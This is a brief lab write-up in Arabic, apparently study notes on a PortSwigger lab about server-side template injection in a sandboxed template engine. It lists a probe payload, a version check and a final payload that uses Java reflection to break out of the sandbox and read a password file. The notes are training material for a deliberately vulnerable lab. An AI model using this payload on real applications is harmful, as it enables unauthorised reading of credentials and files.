# Lab : Server - Side template injection in a sandboxed environment

https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment

- الفكره من ال Lab ده انك تحاول تخرج من sandboxed وتعمل exploit علشان استغل الثغره

```bash
1. ${ 7 * 7 } ==> اتنفز عادي

2. ${ .version } 

3. ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")} ==> ASCII الحل النهائي بس الناتج طلع ب
```
